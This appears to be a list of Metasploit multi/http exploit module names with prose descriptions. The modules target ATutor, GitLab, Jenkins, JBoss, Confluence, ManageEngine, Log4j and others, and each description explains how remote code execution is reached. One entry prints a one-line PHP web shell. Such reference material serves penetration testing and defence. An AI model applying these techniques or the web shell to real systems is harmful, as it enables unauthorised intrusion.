multi/http/atutor_sqli
This module exploits a SQL Injection vulnerability and an authentication weakness vulnerability in ATutor. This essentially means an attacker can bypass authentication and reach the administrator's interface where they can upload malicious code.

multi/http/atutor_upload_traversal
This module exploits an arbitrary file upload vulnerability together with a directory traversal flaw in ATutor versions 2.2.4, 2.2.2 and 2.2.1 in order to execute arbitrary commands. It first creates a zip archive containing a malicious PHP file. The zip archive takes advantage of a directory traversal vulnerability that will cause the PHP file to be dropped in the root server directory (`htdocs` for Windows and `html` for Linux targets). The PHP file contains an encoded payload that allows for remote command execution on the target server. The zip archive can be uploaded via two vectors, the `Import New Language` function and the `Patcher` function. The module first uploads the archive via `Import New Language` and then attempts to execute the payload via an HTTP GET request to the PHP file in the root server directory. If no session is obtained, the module creates another zip archive and attempts exploitation via `Patcher`. Valid credentials for an ATutor admin account are required. This module has been successfully tested against ATutor 2.2.4 running on Windows 10 (XAMPP server).

multi/http/auxilium_upload_exec
This module exploits a vulnerability found in Auxilium RateMyPet's. The site banner uploading feature can be abused to upload an arbitrary file to the web server, which is accessible in the 'banner' directory, thus allowing remote code execution.

multi/http/axis2_deployer
This module logs in to an Axis2 Web Admin Module instance using a specific user/pass and uploads and executes commands via deploying a malicious web service by using SOAP.

multi/http/baldr_upload_exec
This module exploits an arbitrary file upload vulnerability within the Baldr stealer malware control panel when uploading victim log files (which are uploaded as ZIP files). Attackers can turn this vulnerability into an RCE by first registering a new bot to the panel and then uploading a ZIP file containing malicious PHP, which will then uploaded to a publicly accessible directory underneath the /logs web directory. Note that on versions 3.0 and 3.1 the ZIP files containing the victim log files are encoded by XORing them with a random 4 byte key. This exploit module gets around this restriction by retrieving the IP specific XOR key from panel gate before uploading the malicious ZIP file.

multi/http/bassmaster_js_injection
This module exploits an un-authenticated code injection vulnerability in the bassmaster nodejs plugin for hapi. The vulnerability is within the batch endpoint and allows an attacker to dynamically execute JavaScript code on the server side using an eval. Note that the code uses a '\x2f' character so that we hit the match on the regex.

multi/http/bitbucket_env_var_rce
For various versions of Bitbucket, there is an authenticated command injection vulnerability that can be exploited by injecting environment variables into a user name. This module achieves remote code execution as the `atlbitbucket` user by injecting the `GIT_EXTERNAL_DIFF` environment variable, a null character as a delimiter, and arbitrary code into a user's user name. The value (payload) of the `GIT_EXTERNAL_DIFF` environment variable will be run once the Bitbucket application is coerced into generating a diff. This module requires at least admin credentials, as admins and above only have the option to change their user name.

multi/http/bolt_file_upload
Bolt CMS contains a flaw that allows an authenticated remote attacker to execute arbitrary PHP code. This module was tested on version 2.2.4.

multi/http/builderengine_upload_exec

multi/http/caidao_php_backdoor_exec
This module takes advantage of the China Chopper Webshell that is commonly used by Chinese hackers.

multi/http/churchinfo_upload_exec
This module exploits the logic in the CartView.php page when crafting a draft email with an attachment. By uploading an attachment for a draft email, the attachment will be placed in the /tmp_attach/ folder of the ChurchInfo web server, which is accessible over the web by any user. By uploading a PHP attachment and then browsing to the location of the uploaded PHP file on the web server, arbitrary code execution as the web daemon user (e.g. www-data) can be achieved.

multi/http/cisco_dcnm_upload
This module exploits a code execution flaw in Cisco Data Center Network Manager. The vulnerability exists in processImageSave.jsp, which can be abused through a directory traversal and a null byte injection to upload arbitrary files. The autodeploy JBoss application server feature is used to achieve remote code execution. This module has been tested successfully on Cisco Prime Data Center Network Manager 6.1(2) on Windows 2008 R2 (64 bits).

multi/http/cisco_dcnm_upload_2019
DCNM exposes a file upload servlet (FileUploadServlet) at /fm/fileUpload. An authenticated user can abuse this servlet to upload a WAR to the Apache Tomcat webapps directory and achieve remote code execution as root. This module exploits two other vulnerabilities, CVE-2019-1619 for authentication bypass on versions 10.4(2) and below, and CVE-2019-1622 (information disclosure) to obtain the correct directory for the WAR file upload. This module was tested on the DCNM Linux virtual appliance 10.4(2), 11.0(1) and 11.1(1), and should work on a few versions below 10.4(2). Only version 11.0(1) requires authentication to exploit (see References to understand why).

multi/http/clipbucket_fileupload_exec
This module exploits a vulnerability found in ClipBucket versions before 4.0.0 (Release 4902). A malicious file can be uploaded using an unauthenticated arbitrary file upload vulnerability. It is possible for an attacker to upload a malicious script to issue operating system commands. This issue is caused by improper session handling in /action/beats_uploader.php file. This module was tested on ClipBucket before 4.0.0 - Release 4902 on Windows 7 and Kali Linux.

multi/http/cmsms_object_injection_rce
An issue was discovered in CMS Made Simple 2.2.8.

multi/http/cockpit_cms_rce
This module exploits two NoSQLi vulnerabilities to retrieve the user list, and password reset tokens from the system. Next, the USER is targetted to reset their password. Then a command injection vulnerability is used to execute the payload. While it is possible to upload a payload and execute it, the command injection provides a no disk write method which is more stealthy. Cockpit CMS 0.10.0 - 0.11.1, inclusive, contain all the necessary vulnerabilities for exploitation.

multi/http/coldfusion_ckeditor_file_upload
A file upload vulnerability in the CKEditor of Adobe ColdFusion 11 (Update 14 and earlier), ColdFusion 2016 (Update 6 and earlier), and ColdFusion 2018 (July 12 release) allows unauthenticated remote attackers to upload and execute JSP files through the filemanager plugin. Tested on Adobe ColdFusion 2018.0.0.310739.

multi/http/coldfusion_rds_auth_bypass
Adobe ColdFusion 9.0, 9.0.1, 9.0.2, and 10 allows remote attackers to bypass authentication using the RDS component. Due to default settings or misconfiguration, its password can be set to an empty value. This allows an attacker to create a session via the RDS login that can be carried over to the admin web interface even though the passwords might be different, and therefore bypassing authentication on the admin web interface leading to arbitrary code execution. Tested on Windows and Linux with ColdFusion 9.

multi/http/confluence_widget_connector
Widget Connector Macro is part of Atlassian Confluence Server and Data Center that allows embed online videos, slideshows, photostreams and more directly into page. A _template parameter can be used to inject remote Java code into a Velocity template, and gain code execution. Authentication is unrequired to exploit this vulnerability. By default, Java payload will be used because it is cross-platform, but you can also specify which native payload you want (Linux or Windows). Confluence before version 6.6.12, from version 6.7.0 before 6.12.3, from version 6.13.0 before 6.13.3 and from version 6.14.0 before 6.14.2 are affected. This vulnerability was originally discovered by Daniil Dmitriev https://twitter.com/ddv_ua.

multi/http/cups_bash_env_exec
This module exploits the Shellshock vulnerability, a flaw in how the Bash shell handles external environment variables. This module targets CUPS filters through the PRINTER_INFO and PRINTER_LOCATION variables. A valid username and password is required to exploit this vulnerability through CUPS.

multi/http/cuteflow_upload_exec
This module exploits a vulnerability in CuteFlow version 2.11.2 or prior. This application has an upload feature that allows an unauthenticated user to upload arbitrary files to the 'upload/___1/' directory and then execute it.

multi/http/cve_2021_35464_forgerock_openam
This module leverages a pre-authentication remote code execution vulnerability in the OpenAM identity and access management solution. The vulnerability arises from a Java deserialization flaw in OpenAM’s implementation of the Jato framework and can be triggered by a simple one-line GET or POST request to a vulnerable endpoint. Successful exploitation yields code execution on the target system as the service user. This vulnerability also affects the ForgeRock identity platform which is built on top of OpenAM and is thus is susceptible to the same issue.

multi/http/dexter_casinoloader_exec
This module exploits a vulnerability found in the command and control panel used to control Dexter (Point of Sale malware). This is done by accessing the PHP page used by bots to report in (gateway.php) which does not sanitize input. Input is encrypted and encoded, but the key is supplied by the bot connecting. The 'page' parameter is used in this case. The command and control panel designates a location to upload files, and can be used as a reliable location to write a PHP shell. Authentication is not needed to exploit this vulnerability.

multi/http/dotcms_file_upload_rce
When files are uploaded into dotCMS via the content API, but before they become content, dotCMS writes the file down in a temp directory. In the case of this vulnerability, dotCMS does not sanitize the filename passed in via the multipart request header and thus does not sanitize the temp file's name. This allows a specially crafted request to POST files to dotCMS via the ContentResource (POST /api/content) that get written outside of the dotCMS temp directory. In the case of this exploit, an attacker can upload a special .jsp file to the webapp/ROOT directory of dotCMS which can allow for remote code execution.

multi/http/drupal_drupageddon
This module exploits the Drupal HTTP Parameter Key/Value SQL Injection (aka Drupageddon) in order to achieve a remote shell on the vulnerable instance. This module was tested against Drupal 7.0 and 7.31 (was fixed in 7.32). Two methods are available to trigger the PHP payload on the target: - set TARGET 0: Form-cache PHP injection method (default). This uses the SQLi to upload a malicious form to Drupal's cache, then trigger the cache entry to execute the payload using a POP chain. - set TARGET 1: User-post injection method. This creates a new Drupal user, adds it to the administrators group, enable Drupal's PHP module, grant the administrators the right to bundle PHP code in their post, create a new post containing the payload and preview it to trigger the payload execution.

multi/http/eaton_nsm_code_exec
This module exploits a vulnerability in Eaton Network Shutdown Module version <= 3.21, in lib/dbtools.inc which uses unsanitized user input inside a eval() call. Additionally the base64 encoded user credentials are extracted from the database of the application. Please note that in order to be able to steal credentials, the vulnerable service must have at least one USV module (an entry in the "nodes" table in mgedb.db)

multi/http/eventlog_file_upload
This module exploits a file upload vulnerability in ManageEngine Eventlog Analyzer. The vulnerability exists in the agentUpload servlet which accepts unauthenticated file uploads and handles zip file contents in an insecure way. By combining both weaknesses a remote attacker can achieve remote code execution. This module has been tested successfully on versions v7.0 - v9.9 b9002 in Windows and Linux. Versions between 7.0 and < 8.1 are only exploitable via EAR deployment in the JBoss server, while versions 8.1+ are only exploitable via a JSP upload.

multi/http/extplorer_upload_exec
This module exploits an authentication bypass vulnerability in eXtplorer versions 2.1.0 to 2.1.2 and 2.1.0RC5 when run as a standalone application. This application has an upload feature that allows an authenticated user with administrator roles to upload arbitrary files to any writable directory in the web root. This module uses an authentication bypass vulnerability to upload and execute a file.

multi/http/familycms_less_exec
This module exploits an arbitrary command execution vulnerability in Family Connections 2.7.1. It's in the dev/less.php script and is due to an insecure use of system(). Authentication isn't required to exploit the vulnerability but register_globals must be set to On.

multi/http/fortra_goanywhere_rce_cve_2023_0669
This module exploits CVE-2023-0669, which is an object deserialization vulnerability in Fortra GoAnywhere MFT.

multi/http/freenas_exec_raw
This module exploits an arbitrary command execution flaw in FreeNAS 0.7.2 < rev.5543. When passing a specially formatted URL to the exec_raw.php page, an attacker may be able to execute arbitrary commands. NOTE: This module works best with php/meterpreter payloads.

multi/http/gestioip_exec
This module exploits a command injection flaw to create a shell script on the filesystem and execute it. If GestioIP is configured to use no authentication, no password is required to exploit the vulnerability. Otherwise, an authenticated user is required to exploit.

multi/http/getsimplecms_unauth_code_exec
This module exploits a vulnerability found in GetSimpleCMS, which allows unauthenticated attackers to perform Remote Code Execution. An arbitrary file upload (PHPcode for example) vulnerability can be triggered by an authenticated user, however authentication can be bypassed by leaking the cms API key to target the session manager.

multi/http/git_client_command_exec
This module exploits CVE-2014-9390, which affects Git (versions less than 1.8.5.6, 1.9.5, 2.0.5, 2.1.4 and 2.2.1) and Mercurial (versions less than 3.2.3) and describes three vulnerabilities. On operating systems which have case-insensitive file systems, like Windows and OS X, Git clients can be convinced to retrieve and overwrite sensitive configuration files in the .git directory which can allow arbitrary code execution if a vulnerable client can be convinced to perform certain actions (for example, a checkout) against a malicious Git repository. A second vulnerability with similar characteristics also exists in both Git and Mercurial clients, on HFS+ file systems (Mac OS X) only, where certain Unicode codepoints are ignorable. The third vulnerability with similar characteristics only affects Mercurial clients on Windows, where Windows "short names" (MS-DOS-compatible 8.3 format) are supported. Today this module only truly supports the first vulnerability (Git clients on case-insensitive file systems) but has the functionality to support the remaining two with a little work.

multi/http/git_lfs_clone_command_exec
Git clients that support delay-capable clean / smudge filters and symbolic links on case-insensitive file systems are vulnerable to remote code execution while cloning a repository. Usage of clean / smudge filters through Git LFS and a case-insensitive file system changes the checkout order of repository files which enables the placement of a Git hook in the `.git/hooks` directory. By default, this module writes a `post-checkout` script so that the payload will automatically be executed upon checkout of the repository.

multi/http/git_submodule_command_exec
This module exploits CVE-2017-1000117, which affects Git version 2.7.5 and lower. A submodule of the form 'ssh://' can be passed parameters from the username incorrectly. This can be used to inject commands to the operating system when the submodule is cloned. This module creates a fake git repository which contains a submodule containing the vulnerability. The vulnerability is triggered when the submodules are initialised.

multi/http/git_submodule_url_exec
This module exploits CVE-2018-17456, which affects Git versions 2.14.5, 2.15.3, 2.16.5, 2.17.2, 2.18.1, and 2.19.1 and lower. When a submodule url which starts with a dash e.g "-u./payload" is passed as an argument to git clone, the file "payload" inside the repository is executed. This module creates a fake git repository which contains a submodule containing the vulnerability. The vulnerability is triggered when the submodules are initialised (e.g git clone --recurse-submodules URL)

multi/http/gitea_git_fetch_rce
This module exploits Git fetch command in Gitea repository migration process that leads to a remote command execution on the system. This vulnerability affect Gitea before 1.16.7 version.

multi/http/gitea_git_hooks_rce
This module leverages an insecure setting to get remote code execution on the target OS in the context of the user running Gitea. This is possible when the current user is allowed to create `git hooks`, which is the default for administrative users. For non-administrative users, the permission needs to be specifically granted by an administrator. To achieve code execution, the module authenticates to the Gitea web interface, creates a temporary repository, sets a `post-receive` git hook with the payload and creates a dummy file in the repository. This last action will trigger the git hook and execute the payload. Everything is done through the web interface. It has been mitigated in version 1.13.0 by setting the Gitea `DISABLE_GIT_HOOKS` configuration setting to `true` by default. This disables this feature and prevents all users (including admin) from creating custom git hooks. This module has been tested successfully against docker versions 1.12.5, 1.12.6 and 1.13.6 with `DISABLE_GIT_HOOKS` set to `false`, and on version 1.12.6 on Windows.

multi/http/gitlab_exif_rce
This module exploits an unauthenticated file upload and command injection vulnerability in GitLab Community Edition (CE) and Enterprise Edition (EE). The patched versions are 13.10.3, 13.9.6, and 13.8.8. Exploitation will result in command execution as the git user.

multi/http/gitlab_file_read_rce
This module provides remote code execution against GitLab Community Edition (CE) and Enterprise Edition (EE). It combines an arbitrary file read to extract the Rails "secret_key_base", and gains remote code execution with a deserialization vulnerability of a signed 'experimentation_subject_id' cookie that GitLab uses internally for A/B testing. Note that the arbitrary file read exists in GitLab EE/CE 8.5 and later, and was fixed in 12.9.1, 12.8.8, and 12.7.8. However, the RCE only affects versions 12.4.0 and above when the vulnerable `experimentation_subject_id` cookie was introduced. Tested on GitLab 12.8.1 and 12.4.0.

multi/http/gitlab_github_import_rce_cve_2022_2992
An authenticated user can import a repository from GitHub into GitLab. If a user attempts to import a repo from an attacker-controlled server, the server will reply with a Redis serialization protocol object in the nested `default_branch`. GitLab will cache this object and then deserialize it when trying to load a user session, resulting in RCE.

multi/http/gitlab_shell_exec
This module takes advantage of the addition of authorized ssh keys in the gitlab-shell functionality of Gitlab. Versions of gitlab-shell prior to 1.7.4 used the ssh key provided directly in a system call resulting in a command injection vulnerability. As this relies on adding an ssh key to an account, valid credentials are required to exploit this vulnerability.

multi/http/gitlist_arg_injection
This module exploits an argument injection vulnerability in GitList v0.6.0. The vulnerability arises from GitList improperly validating input using the php function 'escapeshellarg'.

multi/http/gitorious_graph
This module exploits an arbitrary command execution vulnerability in gitorious. Unvalidated input is passed to the shell allowing command execution.

multi/http/glassfish_deployer
This module logs in to a GlassFish Server (Open Source or Commercial) using various methods (such as authentication bypass, default credentials, or user-supplied login), and deploys a malicious war file in order to get remote code execution. It has been tested on Glassfish 2.x, 3.0, 4.0 and Sun Java System Application Server 9.x. Newer GlassFish versions do not allow remote access (Secure Admin) by default, but is required for exploitation.

multi/http/glossword_upload_exec
This module exploits a file upload vulnerability in Glossword versions 1.8.8 to 1.8.12 when run as a standalone application. This application has an upload feature that allows an authenticated user with administrator roles to upload arbitrary files to the 'gw_temp/a/' directory.

multi/http/glpi_install_rce
This module exploits an arbitrary command execution vulnerability in the GLPI 'install.php' script. This module is set to ManualRanking due to this module overwriting the target database configuration, which may introduce target instability.

multi/http/gogs_git_hooks_rce
This module leverages an insecure setting to get remote code execution on the target OS in the context of the user running Gogs. This is possible when the current user is allowed to create `git hooks`, which is the default for administrative users. For non-administrative users, the permission needs to be specifically granted by an administrator. To achieve code execution, the module authenticates to the Gogs web interface, creates a temporary repository, sets a `post-receive` git hook with the payload and creates a dummy file in the repository. This last action will trigger the git hook and execute the payload. Everything is done through the web interface. No mitigation has been implemented so far (latest stable version is 0.12.3). This module has been tested successfully against version 0.12.3 on docker. Windows version could not be tested since the git hook feature seems to be broken.

multi/http/horde_csv_rce
The Horde_Data module version 2.1.4 (and before) present in Horde Groupware version 5.2.22 allows authenticated users to inject arbitrary PHP code thus achieving RCE on the server hosting the web application.

multi/http/horde_form_file_upload
Horde Groupware Webmail contains a flaw that allows an authenticated remote attacker to execute arbitrary PHP code. The exploitation requires the Turba subcomponent to be installed. This module was tested on Horde versions 5.2.22 and 5.2.17 running Horde Form subcomponent < 2.0.19.

multi/http/horde_href_backdoor
This module exploits an arbitrary PHP code execution vulnerability introduced as a backdoor into Horde 3.3.12 and Horde Groupware 1.2.10.

multi/http/horizontcms_upload_exec
This module exploits an arbitrary file upload vulnerability in HorizontCMS 1.0.0-beta in order to execute arbitrary commands. The module first attempts to authenticate to HorizontCMS. It then tries to upload a malicious PHP file via an HTTP POST request to `/admin/file-manager/fileupload`. The server will rename this file to a random string. The module will therefore attempt to change the filename back to the original name via an HTTP POST request to `/admin/file-manager/rename`. For the `php` target, the payload is embedded in the uploaded file and the module attempts to execute the payload via an HTTP GET request to `/storage/file_name`. For the `linux` and `windows` targets, the module uploads a simple PHP web shell similar to `<?php system($_GET["cmd"]); ?>`. Subsequently, it leverages the CmdStager mixin to deliver the final payload via a series of HTTP GET requests to the PHP web shell. Valid credentials for a HorizontCMS user with permissions to use the FileManager are required. This would be all users in the Admin, Manager and Editor groups if HorizontCMS is configured with the default group settings.This module has been successfully tested against HorizontCMS 1.0.0-beta running on Ubuntu 18.04.

multi/http/hp_sitescope_issuesiebelcmd
This module exploits a code execution flaw in HP SiteScope. The vulnerability exists in the APISiteScopeImpl web service, specifically in the issueSiebelCmd method, which allows the user to execute arbitrary commands without authentication. This module has been tested successfully on HP SiteScope 11.20 over Windows 2003 SP2, Windows 2008 and CentOS 6.5.

multi/http/hp_sitescope_uploadfileshandler
This module exploits a code execution flaw in HP SiteScope. It exploits two vulnerabilities in order to get its objective. An authentication bypass in the create operation, available through the APIPreferenceImpl AXIS service, to create a new account with empty credentials and, subsequently, uses the new account to abuse the UploadManagerServlet and upload an arbitrary payload embedded in a JSP. The module has been tested successfully on HP SiteScope 11.20 over Windows 2003 SP2 and Linux CentOS 6.3.

multi/http/hp_sys_mgmt_exec
This module exploits a vulnerability found in HP System Management Homepage. By supplying a specially crafted HTTP request, it is possible to control the 'tempfilename' variable in function JustGetSNMPQueue (found in ginkgosnmp.inc), which will be used in a exec() function.

multi/http/hyperic_hq_script_console
This module uses the VMware Hyperic HQ Groovy script console to execute OS commands using Java. Valid credentials for an application administrator user account are required. This module has been tested successfully with Hyperic HQ 4.6.6 on Windows 2003 SP2 and Ubuntu 10.04 systems.

multi/http/ibm_openadmin_tool_soap_welcomeserver_exec
This module exploits an unauthenticated remote PHP code execution vulnerability in IBM OpenAdmin Tool included with IBM Informix versions 11.5, 11.7, and 12.1. The 'welcomeServer' SOAP service does not properly validate user input in the 'new_home_page' parameter of the 'saveHomePage' method allowing arbitrary PHP code to be written to the config.php file. The config.php file is executed in most pages within the application, and accessible directly via the web root, resulting in code execution. This module has been tested successfully on IBM OpenAdmin Tool 3.14 on Informix 12.10 Developer Edition (SUSE Linux 11) virtual appliance.

multi/http/ispconfig_php_exec
ISPConfig allows an authenticated administrator to export language settings into a PHP script which is intended to be reuploaded later to restore language settings. This feature can be abused to run aribitrary PHP code remotely on the ISPConfig server. This module was tested against version 3.0.5.2.

multi/http/jboss_bshdeployer
This module can be used to install a WAR file payload on JBoss servers that have an exposed "jmx-console" application. The payload is put on the server by using the jboss.system:BSHDeployer\'s createScriptDeployment() method.

multi/http/jboss_deploymentfilerepository
This module uses the DeploymentFileRepository class in JBoss Application Server (jbossas) to deploy a JSP file which then deploys the WAR file.

multi/http/jboss_invoke_deploy
This module can be used to execute a payload on JBoss servers that have an exposed HTTPAdaptor's JMX Invoker exposed on the "JMXInvokerServlet". By invoking the methods provided by jboss.admin:DeploymentFileRepository a stager is deployed to finally upload the selected payload to the target. The DeploymentFileRepository methods are only available on Jboss 4.x and 5.x.

multi/http/jboss_maindeployer
This module can be used to execute a payload on JBoss servers that have an exposed "jmx-console" application. The payload is put on the server by using the jboss.system:MainDeployer functionality. To accomplish this, a temporary HTTP server is created to serve a WAR archive containing our payload. This method will only work if the target server allows outbound connections to us.

multi/http/jboss_seam_upload_exec
Versions of the JBoss Seam 2 framework < 2.2.1CR2 fails to properly sanitize inputs to some JBoss Expression Language expressions. As a result, attackers can gain remote code execution through the application server. This module leverages RCE to upload and execute a given payload. Versions of the JBoss application server (AS) admin-console are known to be vulnerable to this exploit, without requiring authentication. Tested against JBoss AS 5 and 6, running on Linux with JDKs 6 and 7. This module provides a more efficient method of exploitation - it does not loop to find desired Java classes and methods.

multi/http/jenkins_metaprogramming
This module exploits a vulnerability in Jenkins dynamic routing to bypass the Overall/Read ACL and leverage Groovy metaprogramming to download and execute a malicious JAR file. When the "Java Dropper" target is selected, the original entry point based on classLoader.parseClass is used, which requires the use of Groovy metaprogramming to achieve RCE. When the "Unix In-Memory" target is selected, a newer, higher-level, and more universal entry point based on GroovyShell.parse is used. This permits the use of in-memory arbitrary command execution. The ACL bypass gadget is specific to Jenkins <= 2.137 and will not work on later versions of Jenkins. Tested against Jenkins 2.137 and Pipeline: Groovy Plugin 2.61.

multi/http/jenkins_script_console
This module uses the Jenkins-CI Groovy script console to execute OS commands using Java.

multi/http/jenkins_xstream_deserialize
This module exploits CVE-2016-0792 a vulnerability in Jenkins versions older than 1.650 and Jenkins LTS versions older than 1.642.2 which is caused by unsafe deserialization in XStream with Groovy in the classpath, which allows remote arbitrary code execution. The issue affects default installations. Authentication is not required to exploit the vulnerability.

multi/http/jetbrains_teamcity_rce_cve_2023_42793
This module exploits an authentication bypass vulnerability to achieve unauthenticated remote code execution against a vulnerable JetBrains TeamCity server. All versions of TeamCity prior to version 2023.05.4 are vulnerable to this issue. The vulnerability was originally discovered by SonarSource.

multi/http/jira_hipchat_template
Atlassian Hipchat is a web service for internal instant messaging. A plugin is available for Jira that allows team collaboration at real time. A message can be used to inject Java code into a Velocity template, and gain code execution as Jira. Authentication is required to exploit this vulnerability, and you must make sure the account you're using isn't protected by captcha. By default, Java payload will be used because it is cross-platform, but you can also specify which native payload you want (Linux or Windows). HipChat for Jira plugin versions between 1.3.2 and 6.30.0 are affected. Jira versions between 6.3.5 and 6.4.10 are also affected by default, because they were bundled with a vulnerable copy of HipChat. When using the check command, if you supply a valid username and password, the module will be able to trigger the bug and check more accurately. If not, it falls back to passive, which can only tell if the target is running on a Jira version that is bundled with a vulnerable copy of Hipchat by default, which is less reliable. This vulnerability was originally discovered internally by Atlassian.

multi/http/jira_plugin_upload
This module can be used to execute a payload on Atlassian Jira via the Universal Plugin Manager(UPM). The module requires valid login credentials to an account that has access to the plugin manager. The payload is uploaded as a JAR archive containing a servlet using a POST request against the UPM component. The check command will test the validity of user supplied credentials and test for access to the plugin manager.

multi/http/joomla_http_header_rce
Joomla suffers from an unauthenticated remote code execution that affects all versions from 1.5.0 to 3.4.5. By storing user supplied headers in the databases session table it's possible to truncate the input by sending an UTF-8 character. The custom created payload is then executed once the session is read from the database. You also need to have a PHP version before 5.4.45 (including 5.3.x), 5.5.29 or 5.6.13. In later versions the deserialisation of invalid session data stops on the first error and the exploit will not work. The PHP Patch was included in Ubuntu versions 5.5.9+dfsg-1ubuntu4.13 and 5.3.10-1ubuntu3.20 and in Debian in version 5.4.45-0+deb7u1.

multi/http/kong_gateway_admin_api_rce
This module uses the Kong admin API to create a route and a serverless function plugin that is associated with the route. The plugin runs Lua code and is used to run a system command using os.execute(). After execution the route is deleted, which also deletes the plugin.

multi/http/kordil_edms_upload_exec
This module exploits a vulnerability in Kordil EDMS v2.2.60rc3. This application has an upload feature that allows an unauthenticated user to upload arbitrary files to the '/kordil_edms/userpictures/' directory.

multi/http/lcms_php_exec
This module exploits a vulnerability found in Lotus CMS 3.0's Router() function. This is done by embedding PHP code in the 'page' parameter, which will be passed to a eval call, therefore allowing remote code execution. The module can either automatically pick up a 'page' parameter from the default page, or manually specify one in the URI option. To use the automatic method, please supply the URI with just a directory path, for example: "/lcms/". To manually configure one, you may do: "/lcms/somepath/index.php?page=index"

multi/http/liferay_java_unmarshalling
This module exploits a Java unmarshalling vulnerability via JSONWS in Liferay Portal versions < 6.2.5 GA6, 7.0.6 GA7, 7.1.3 GA4, and 7.2.1 GA2 to execute code as the Liferay user. Tested against 7.2.0 GA1.

multi/http/log1cms_ajax_create_folder
This module exploits the "Ajax File and Image Manager" component that can be found in log1 CMS. In function.base.php of this component, the 'data' parameter in writeInfo() allows any malicious user to have direct control of writing data to file data.php, which results in arbitrary remote code execution.

multi/http/log4shell_header_injection
Versions of Apache Log4j2 impacted by CVE-2021-44228 which allow JNDI features used in configuration, log messages, and parameters, do not protect against attacker controlled LDAP and other JNDI related endpoints. This module will exploit an HTTP end point with the Log4Shell vulnerability by injecting a format message that will trigger an LDAP connection to Metasploit and load a payload. The Automatic target delivers a Java payload using remote class loading. This requires Metasploit to run an HTTP server in addition to the LDAP server that the target can connect to. The targeted application must have the trusted code base option enabled for this technique to work. The non-Automatic targets deliver a payload via a serialized Java object. This does not require Metasploit to run an HTTP server and instead leverages the LDAP server to deliver the serialized object. The target application in this case must be compatible with the user-specified JAVA_GADGET_CHAIN option.

multi/http/lucee_scheduled_job
This module can be used to execute a payload on Lucee servers that have an exposed administrative web interface. It's possible for an administrator to create a scheduled job that queries a remote ColdFusion file, which is then downloaded and executed when accessed. The payload is uploaded as a cfm file when queried by the target server. When executed, the payload will run as the user specified during the Lucee installation. On Windows, this is a service account; on Linux, it is either the root user or lucee.

multi/http/magento_unserialize
This module exploits a PHP object injection vulnerability in Magento 2.0.6 or prior.

multi/http/makoserver_cmd_exec
This module exploits a vulnerability found in Mako Server v2.5, 2.6. It's possible to inject arbitrary OS commands in the Mako Server tutorial page through a PUT request to save.lsp. Attacker input will be saved on the victims machine and can be executed by sending a GET request to manage.lsp.

multi/http/manage_engine_dc_pmp_sqli
This module exploits an unauthenticated blind SQL injection in LinkViewFetchServlet, which is exposed in ManageEngine Desktop Central v7 build 70200 to v9 build 90033 and Password Manager Pro v6 build 6500 to v7 build 7002 (including the MSP versions). The SQL injection can be used to achieve remote code execution as SYSTEM in Windows or as the user in Linux. This module exploits both PostgreSQL (newer builds) and MySQL (older or upgraded builds). MySQL targets are more reliable due to the use of relative paths; with PostgreSQL you should find the web root path via other means and specify it with WEB_ROOT. The injection is only exploitable via a GET request, which means that the payload has to be sent in chunks smaller than 8000 characters (URL size limitation). Small payloads and the use of exe-small is recommended, as you can only do between 10 and 20 injections before using up all the available ManagedConnections until the next server restart. This vulnerability exists in all versions released since 2006, however builds below DC v7 70200 and PMP v6 6500 do not ship with a JSP compiler. You can still try your luck using the MySQL targets as a JDK might be installed in the $PATH.

multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966
This exploits an unauthenticated remote code execution vulnerability that affects Zoho ManageEngine AdSelfService Plus versions 6210 and below (CVE-2022-47966). Due to a dependency to an outdated library (Apache Santuario version 1.4.1), it is possible to execute arbitrary code by providing a crafted `samlResponse` XML to the ADSelfService Plus SAML endpoint. Note that the target is only vulnerable if it has been configured with SAML-based SSO at least once in the past, regardless of the current SAML-based SSO status.

multi/http/manageengine_auth_upload
This module exploits a directory traversal vulnerability in ManageEngine ServiceDesk, AssetExplorer, SupportCenter and IT360 when uploading attachment files. The JSP that accepts the upload does not handle correctly '../' sequences, which can be abused to write to the file system. Authentication is needed to exploit this vulnerability, but this module will attempt to login using the default credentials for the administrator and guest accounts. Alternatively, you can provide a pre-authenticated cookie or a username / password. For IT360 targets, enter the RPORT of the ServiceDesk instance (usually 8400). All versions of ServiceDesk prior v9 build 9031 (including MSP but excluding v4), AssetExplorer, SupportCenter and IT360 (including MSP) are vulnerable. At the time of release of this module, only ServiceDesk v9 has been fixed in build 9031 and above. This module has been tested successfully in Windows and Linux on several versions.

multi/http/manageengine_sd_uploader
This module exploits a file upload vulnerability in ManageEngine ServiceDesk Plus. The vulnerability exists in the FileUploader servlet which accepts unauthenticated file uploads. This module has been tested successfully on versions v9 b9000 - b9102 in Windows and Linux. The MSP versions do not expose the vulnerable servlet.

multi/http/manageengine_search_sqli
This module exploits a SQL injection found in ManageEngine Security Manager Plus advanced search page, which results in remote code execution under the context of SYSTEM in Windows; or as the user in Linux. Authentication is not required in order to exploit this vulnerability.

multi/http/manageengine_servicedesk_plus_saml_rce_cve_2022_47966
This exploits an unauthenticated remote code execution vulnerability that affects Zoho ManageEngine ServiceDesk Plus versions 14003 and below (CVE-2022-47966). Due to a dependency to an outdated library (Apache Santuario version 1.4.1), it is possible to execute arbitrary code by providing a crafted `samlResponse` XML to the ServiceDesk Plus SAML endpoint. Note that the target is only vulnerable if it has been configured with SAML-based SSO at least once in the past, regardless of the current SAML-based SSO status.

multi/http/mantisbt_manage_proj_page_rce
Mantis v1.1.3 and earlier are vulnerable to a post-authentication Remote Code Execution vulnerability in the sort parameter of the manage_proj_page.php page.

multi/http/mantisbt_php_exec
This module exploits a post-auth vulnerability found in MantisBT versions 1.2.0a3 up to 1.2.17 when the Import/Export plugin is installed. The vulnerable code exists on plugins/XmlImportExport/ImportXml.php, which receives user input through the "description" field and the "issuelink" attribute of an uploaded XML file and passes to preg_replace() function with the /e modifier. This allows a remote authenticated attacker to execute arbitrary PHP code on the remote machine. This version also suffers from another issue. The import page is not checking the correct user level of the user, so it's possible to exploit this issue with any user including the anonymous one if enabled.

multi/http/maracms_upload_exec
